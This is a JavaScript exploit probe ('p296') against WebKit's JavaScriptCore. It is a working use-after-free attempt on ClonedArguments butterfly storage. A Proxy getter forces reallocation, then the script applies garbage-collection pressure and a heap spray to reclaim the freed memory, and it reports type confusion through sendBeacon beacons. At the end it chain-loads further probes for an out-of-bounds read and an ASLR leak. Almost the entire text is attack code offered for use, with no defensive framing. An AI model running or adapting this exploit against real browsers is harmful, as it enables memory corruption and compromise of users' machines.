// p296 - ClonedArguments butterfly UAF via copyToArguments stale data pointer
//
// ClonedArguments.cpp:288-289 caches butterfly data pointer.
// Named property growth forces butterfly reallocation (property storage at negative offsets).
// After realloc: old butterfly freed, data pointer stale, loop reads freed memory.
//
// Fix from p295: setTimeout between victim setup and apply call clears C++ stack.
// Fix from p296: named property growth instead of args[0x7FFFFFFF] (which silently failed).
//
// Beacon prefix: V296-

(function() {
  var BQ = [], flushing = false;
  function B(tag, body) {
    BQ.push([tag, body || '']);
    if (!flushing) flush();
  }
  function flush() {
    if (!BQ.length) { flushing = false; return; }
    flushing = true;
    var item = BQ.shift();
    try {
      navigator.sendBeacon('/beacon/V296-' + item[0] + '?t=' + Date.now(), item[1]);
    } catch(e) {}
    setTimeout(flush, 12);
  }
  function hex(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }

  B('BOOT');

  function target() { return arguments; }

  var HOLE = 3;
  var VIC = 40;
  var N = 64;
  var SPRAY_N = 8000;
  var ROUNDS = 12;
  var SENTINEL_IDX = 62;
  var SENTINEL_VAL = 777777;
  var POST_SENTINEL = 999999;

  function attempt(round) {
    var dummyArgs = [];
    for (var i = 0; i < N; i++) dummyArgs.push(i + 1);
    var args = target.apply(null, dummyArgs);
    dummyArgs = null;

    var victim = { vA: 0xAAAA0000 + round, vB: 0xBBBB0000 + round, vP: 'VIC', vQ: round };
    var wr = null;
    try { wr = new WeakRef(victim); } catch(e) {}

    args[VIC] = victim;
    args[VIC + 1] = victim;
    args[SENTINEL_IDX] = SENTINEL_VAL;
    delete args[HOLE];
    victim = null;

    setTimeout(function phase2() {
      var trapFired = false;
      var spraySrc = [];

      Object.setPrototypeOf(args, new Proxy({}, {
        get: function(t, prop) {
          if (trapFired) return 0xFACE;
          trapFired = true;

          try {
            // PHASE A: force butterfly reallocation via named property growth
            // Named props stored at negative offsets from butterfly pointer.
            // When property capacity exhausts, entire butterfly reallocated.
            // Old butterfly freed by bmalloc. data pointer now stale.
            for (var p = 0; p < 200; p++) {
              args['_p' + p] = p;
            }

            // Write sentinel to NEW butterfly to detect stale pointer
            args[SENTINEL_IDX] = POST_SENTINEL;

            // PHASE B: remove victim from CURRENT (new) butterfly
            // Old freed butterfly still has victim at VIC (not zeroed by bmalloc)
            args[VIC] = null;
            args[VIC + 1] = null;

            // PHASE C: GC pressure to collect victim
            // Victim only referenced from old freed butterfly (auxiliary cell, not traced by GC)
            var junk;
            for (var g = 0; g < 80; g++) {
              junk = new Array(20000);
              for (var k = 0; k < 20000; k++) junk[k] = { x: k, y: k + 1 };
              junk = null;
            }

            var gcResult = 'UNKNOWN';
            if (wr) {
              var d = wr.deref();
              gcResult = d ? 'ALIVE' : 'FREED';
              d = null;
            }
            B('R' + round + '-GC-' + gcResult);

            // PHASE D: spray to reclaim old butterfly memory
            for (var s = 0; s < SPRAY_N; s++) {
              var arr = new Array(N);
              for (var idx = 0; idx < N; idx++) {
                arr[idx] = 10000 + s;
              }
              spraySrc.push(arr);
            }
            B('R' + round + '-SPRAY-' + spraySrc.length);

          } catch(e) {
            B('R' + round + '-TRAP-ERR-' + e.message.substring(0, 40));
          }
          return 0xBEEF;
        }
      }));

      function reader() {
        return Array.prototype.slice.call(arguments);
      }

      var result;
      try {
        result = reader.apply(null, args);
      } catch(e) {
        B('R' + round + '-APPLY-ERR-' + e.message.substring(0, 40));
        nextRound(round, null);
        return;
      }

      if (!result) {
        B('R' + round + '-NORESULT');
        nextRound(round, null);
        return;
      }

      B('R' + round + '-LEN-' + result.length);

      // DIAGNOSTIC: check sentinel to detect stale pointer
      var sentVal = result[SENTINEL_IDX];
      if (typeof sentVal === 'number') {
        if (sentVal === SENTINEL_VAL) {
          B('R' + round + '-SENT-OLD');  // data read from OLD butterfly (stale pointer works!)
        } else if (sentVal === POST_SENTINEL) {
          B('R' + round + '-SENT-NEW');  // data read from NEW butterfly (no UAF)
        } else {
          B('R' + round + '-SENT-NUM-' + sentVal);  // spray or garbage
        }
      } else if (sentVal === null || sentVal === undefined) {
        B('R' + round + '-SENT-NULL');
      } else {
        B('R' + round + '-SENT-T-' + typeof sentVal);
      }

      // Check victim slot
      var v = result[VIC];
      var origCount = 0;
      var changedCount = 0;
      var changedDetail = [];

      for (var c = HOLE + 1; c < N; c++) {
        if (c === VIC || c === VIC + 1 || c === SENTINEL_IDX) continue;
        var rv = result[c];
        if (typeof rv === 'number' && rv === (c + 1)) {
          origCount++;
        } else {
          changedCount++;
          if (changedDetail.length < 10) {
            if (rv === null || rv === undefined) changedDetail.push(c + '=null');
            else if (typeof rv === 'number') changedDetail.push(c + '=N:' + rv);
            else if (typeof rv === 'object') changedDetail.push(c + '=OBJ');
            else changedDetail.push(c + '=T:' + typeof rv);
          }
        }
      }

      B('R' + round + '-ORIG-' + origCount + '-CHG-' + changedCount);
      if (changedDetail.length > 0) {
        B('R' + round + '-CHG-D', changedDetail.join(' '));
      }

      var hitResult = null;

      if (typeof v === 'object' && v !== null) {
        if (v.vA !== undefined) {
          B('R' + round + '-VIC-INTACT-' + hex((v.vA || 0) >>> 0));
        } else {
          B('R' + round + '-VIC-CONFUSED');
          try { B('R' + round + '-VIC-KEYS', Object.keys(v).slice(0, 6).join(',')); } catch(e) {}
          hitResult = { type: 'object', round: round, obj: v };
        }
      } else if (v === null || v === undefined) {
        B('R' + round + '-VIC-NULL');
      } else if (typeof v === 'number') {
        B('R' + round + '-VIC-NUM-' + v);
        if (v >= 10000 && v < 10000 + SPRAY_N) {
          B('R' + round + '-BUTTERFLY-RECLAIM-' + (v - 10000));
          hitResult = { type: 'butterfly', round: round, idx: v - 10000 };
        }
      } else {
        B('R' + round + '-VIC-T-' + typeof v);
      }

      var hole = result[HOLE];
      if (typeof hole === 'number') B('R' + round + '-HOLE-' + hex(hole >>> 0));

      if (wr) {
        var postD = wr.deref();
        B('R' + round + '-POST-' + (postD ? 'ALIVE' : 'FREED'));
      }

      spraySrc = null;
      nextRound(round, hitResult);
    }, 50);
  }

  function nextRound(prevRound, hitResult) {
    if (hitResult) {
      B('HIT-R' + hitResult.round + '-TYPE-' + hitResult.type);
      if (hitResult.type === 'butterfly') {
        B('BUTTERFLY-UAF-CONFIRMED');
      } else if (hitResult.type === 'object') {
        B('TYPE-CONFUSION-CONFIRMED');
      }
      B('DONE-SUCCESS');
      return;
    }
    var nextR = prevRound + 1;
    if (nextR >= ROUNDS) {
      B('DONE-NO-HIT');
      return;
    }
    setTimeout(function() { attempt(nextR); }, 100);
  }

  attempt(0);
})();

// === Chain-loaded probes (piggybacking on p296 dispatch) ===

// p320 Stream Tee OOB — lightweight, runs immediately
setTimeout(function() {
  try {
    var s = document.createElement('script');
    s.src = 'p320-stream-tee-oob.js?v=320b';
    document.body.appendChild(s);
  } catch(e) {}
}, 500);

// p156 MetadataTable ASLR leak via structuredClone transfer — heavy, may crash
setTimeout(function() {
  try {
    var s = document.createElement('script');
    s.src = 'p156-bait-switch-leak.js?v=156c';
    document.body.appendChild(s);
  } catch(e) {}
}, 5000);
